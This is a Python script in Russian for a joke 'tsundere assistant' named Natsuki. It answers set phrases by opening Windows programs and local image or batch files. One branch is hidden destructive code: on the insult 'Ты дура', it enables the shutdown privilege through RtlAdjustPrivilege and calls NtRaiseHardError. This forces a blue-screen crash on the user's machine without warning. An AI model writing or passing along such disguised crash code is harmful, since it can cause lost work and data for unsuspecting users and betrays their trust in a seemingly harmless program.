import subprocess
from ctypes import windll 
from ctypes import c_int 
from ctypes import c_uint 
from ctypes import c_ulong 
from ctypes import POINTER 
from ctypes import byref 
import time 
import os
import sys


def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)

def clear_console():
    command = "cls"
    subprocess.run(command, shell=True)    



input("Добро пожаловать в ваш цундере помощник, а если точнее, то цундере будет Нацуки. Удачи!    ver.1.6 ")
clear_console()
print("Дурак, и зачем ты сюда зашёл??")
while True:
   user_sub = input("Ввод: ")

   if user_sub == "Открой калькулятор":
    clear_console()
    print("Не то чтобы я хотела!! Но так и быть...")
    time.sleep(2)
    subprocess.Popen(["calc.exe"])
    input("Нажми Enter чтобы вернуться обратно! Хмпф!")
    clear_console()
 

   elif user_sub == "Открой проводник":
    clear_console()
    print("И зачем тебе моя помощь?? Он у тебя на рабочем столе есть! Дурак!")
    time.sleep(3)
    subprocess.Popen(["explorer.exe"])
    input("Нажми Enter чтобы вернуться обратно! Хмпф!")
    clear_console()


   elif user_sub == "Открой пэйнт":
    clear_console()
    print("Что ты там рисовать собрался?? Дофига художник?!!")    
    time.sleep(2)
    subprocess.Popen(["mspaint.exe"])
    input("Нажми Enter чтобы вернуться обратно! Хмпф!")
    clear_console()
   

   elif user_sub == "Открой ютуб":
    clear_console()
    print("Ютуб? Ты серьезно? Надеюсь прохождение доки доки...")
    time.sleep(2)
    os.startfile(resource_path("assets/youtube.bat"))
    input("Нажми Enter чтобы вернуться обратно! Хмпф!")
    clear_console()
  

   elif user_sub == "Ты милашка":
    clear_console()
    print("Ч-Ч-ЧТООО??? ТЫ С УМА СОШЁЛ??? УЙДИ ПРОЧЬ!! ХМПФ!!!")
    time.sleep(2)
    input("Нажми Enter чтобы вернуться обратно! Хмпф!")
    clear_console()
   

   elif user_sub == "Ты дура":
    clear_console()
    print("Как ты посмел!! Ну получай подарочек)))")
    time.sleep(3)
    nullptr = POINTER(c_int)() 
    windll.ntdll.RtlAdjustPrivilege( 
       c_uint(19), 
       c_uint(1), 
       c_uint(0), 
       byref(c_int()) 
) 
    windll.ntdll.NtRaiseHardError( 
       c_ulong(0xC000007B), 
       c_ulong(0), 
       nullptr, 
       nullptr, 
       c_uint(6), 
       byref(c_uint()) 
)

   elif user_sub == "Открой блокнот":
    clear_console()
    print("Стихи собрался писать? Надеюсь для меня... Ой, то есть... ХМПФ!")
    time.sleep(3)
    subprocess.Popen(["notepad.exe"])
    input("Нажми Enter чтобы вернуться обратно! Хмпф!")
    clear_console()
   

   elif user_sub == "Открой ???":
    clear_console()
    print("&ASDASjDjasdNASJdnwhjFldSBFherlf")
    time.sleep(1)
    os.startfile(resource_path("assets/san.png"))
    input("HJSDFHSDFHBNKSFDHBSDYUIKFB@*#!@*SDKHJ")
    clear_console()
    

   elif user_sub == "Открой ВК":
    clear_console()
    print("Зачем тебе эта бредовая соцсеть?? Писать кому-то собрался? Дурак дурак!")
    time.sleep(3)
    os.startfile(resource_path("assets/msedge.bat"))
    input("Нажми Enter чтобы вернуться обратно! Хмпф!") 
    clear_console()
   

   elif user_sub == "Я тебя люблю":
    clear_console()
    print("АААААА???? *покраснела* ДУРАКК! ПРИДУРОК!!! ДУРАК ДУРАК ДУРАК ДУРАК ДУРАК!!! но... я может... Забудь! ")
    time.sleep(2)
    input("Нажми Enter чтобы вернуться обратно! Хмпф!")    
    clear_console()
   

   elif user_sub == "Приготовь покушать":
    clear_console()
    print("ТЫ..!! ... Ладно! Но только чтобы ты тут с голоду не умер, ясно? Не думай что это какая-то забота... ")
    time.sleep(2)
    os.startfile(resource_path("assets/pearl.jpg"))
    os.startfile(resource_path("assets/eat.png"))
    input("Нажми Enter чтобы вернуться обратно! Хмпф!") 
    clear_console()
   

   elif user_sub == "Покажи себя":
    clear_console()
    print("Зачем тебе?? Много хочешь! ... Ну ладно... Одна фоточка...")
    time.sleep(2)
    os.startfile(resource_path("assets/nat.jpg"))
    input("Нажми Enter чтобы вернуться обратно! Хмпф!")  
    clear_console()

   elif user_sub == "Пока":
     clear_console()
     print("Ну и уходи! Не очень-то и хотелось тебе помогать...")
     time.sleep(2)
     break

   elif user_sub == "Разденься":
     clear_console()
     print("ИДИОТ!! ДУРАК! ИЗВРАЩЕНЕЦ!! ЧТО ЭТО ЗА ЖЕЛАНИЯ ТАКИЕ???? ДА НИКОГДА В ЖИЗНИ!")
     time.sleep(2)
     input("Нажми Enter чтобы вернуться обратно! Хмпф!")
     clear_console()


   else:
     clear_console()
     print("Ты что написал?? Я не понимаю! Идиот!") 
     time.sleep(2)
     input("Нажми Enter чтобы вернуться обратно! Хмпф!")  
     clear_console()



